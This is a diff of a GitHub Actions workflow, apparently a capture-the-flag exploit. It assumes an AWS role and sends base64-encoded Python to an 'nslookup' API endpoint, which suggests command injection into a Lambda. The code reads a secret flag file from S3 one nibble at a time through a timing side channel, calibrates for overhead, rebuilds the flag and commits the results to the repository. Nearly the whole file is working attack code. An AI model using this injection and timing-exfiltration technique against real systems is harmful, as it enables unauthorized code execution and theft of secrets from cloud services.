@@ -25,7 +25,7 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Extract nibbles and verify inline
+      - name: Extract nibbles + calibrate + verify inline
         run: |
           URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
 
@@ -38,37 +38,51 @@ jobs:
             local t1=$(date +%s%3N)
             local dt=$((t1-t0))
             echo "$label ${dt}ms"
-            echo "$label ${dt}ms" >> nibbles2.txt
+            echo "$label ${dt}ms" >> nibbles3.txt
           }
 
-          echo "# nibble extraction run $(date -u)" > nibbles2.txt
+          echo "# extraction run $(date -u)" > nibbles3.txt
 
+          # Extract hi nibbles: sleep = flag[i] >> 4
           for i in $(seq 0 15); do
             PY="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(flag[${i}]>>4)"
             run_timed "hi${i}" "$(echo -n "$PY" | base64 -w0)"
           done
 
+          # Extract lo nibbles: sleep = flag[i] & 0xF
           for i in $(seq 0 15); do
             PY="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(flag[${i}]&0xF)"
             run_timed "lo${i}" "$(echo -n "$PY" | base64 -w0)"
           done
 
-          # Analyze locally: overhead from bytes 3,8,12 (confirmed hi=7 from Phase2HI)
+          # Calibration: sleep=0 (Lambda is warm after 32 calls)
+          # This gives pure overhead (S3 read + subprocess, no sleep)
+          CAL_PY="import boto3,time;boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(0)"
+          run_timed "cal_sleep0" "$(echo -n "$CAL_PY" | base64 -w0)"
+          run_timed "cal_sleep0_2" "$(echo -n "$CAL_PY" | base64 -w0)"
+
+          # Analyze locally using cal_sleep0 as overhead reference
           ANALYSIS=$(python3 -c "
           timings = {}
-          for line in open('nibbles2.txt'):
+          for line in open('nibbles3.txt'):
               p = line.strip().split()
               if len(p) == 2:
                   timings[p[0]] = int(p[1].replace('ms',''))
-          hi3 = timings.get('hi3', 9000)
-          hi8 = timings.get('hi8', 9000)
-          hi12 = timings.get('hi12', 9000)
-          overhead = (hi3 - 7000 + hi8 - 7000 + hi12 - 7000) / 3
+
+          # Use warm calibration as overhead
+          c1 = timings.get('cal_sleep0', 2000)
+          c2 = timings.get('cal_sleep0_2', 2000)
+          overhead = (c1 + c2) / 2
+
+          # Compute nibbles and flag bytes
           flag_bytes = []
           for i in range(16):
-              hi = max(0, min(15, round((timings.get('hi'+str(i), overhead) - overhead) / 1000)))
-              lo = max(0, min(15, round((timings.get('lo'+str(i), overhead) - overhead) / 1000)))
+              hi_ms = timings.get('hi'+str(i), overhead)
+              lo_ms = timings.get('lo'+str(i), overhead)
+              hi = max(0, min(15, round((hi_ms - overhead) / 1000)))
+              lo = max(0, min(15, round((lo_ms - overhead) / 1000)))
               flag_bytes.append((hi << 4) | lo)
+
           flag_hex = ''.join('{:02x}'.format(b) for b in flag_bytes)
           flag_ascii = ''.join(chr(b) if 32<=b<=126 else '.' for b in flag_bytes)
           print('OVERHEAD=' + str(round(overhead)))
@@ -85,15 +99,15 @@ jobs:
           PY_CMP="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(10 if flag==bytes.fromhex('${FLAG_HEX}') else 2)"
           B64_CMP=$(echo -n "$PY_CMP" | base64 -w0)
 
-          echo "# verify run $(date -u)" > verify2.txt
-          echo "FLAG_HEX=$FLAG_HEX" >> verify2.txt
-          echo "FLAG_ASCII=$FLAG_ASCII" >> verify2.txt
+          echo "# verify run $(date -u)" > verify3.txt
+          echo "FLAG_HEX=$FLAG_HEX" >> verify3.txt
+          echo "FLAG_ASCII=$FLAG_ASCII" >> verify3.txt
           run_timed "verify" "$B64_CMP"
 
       - name: Commit results
         run: |
           git config user.email "bot@github-actions"
           git config user.name "GitHub Actions"
-          git add nibbles2.txt verify2.txt
-          git commit -m "re-extract + inline verify" || echo "Nothing to commit"
+          git add nibbles3.txt verify3.txt
+          git commit -m "re-extract v3 + warm calibration + inline verify" || echo "Nothing to commit"
           git push origin corgi
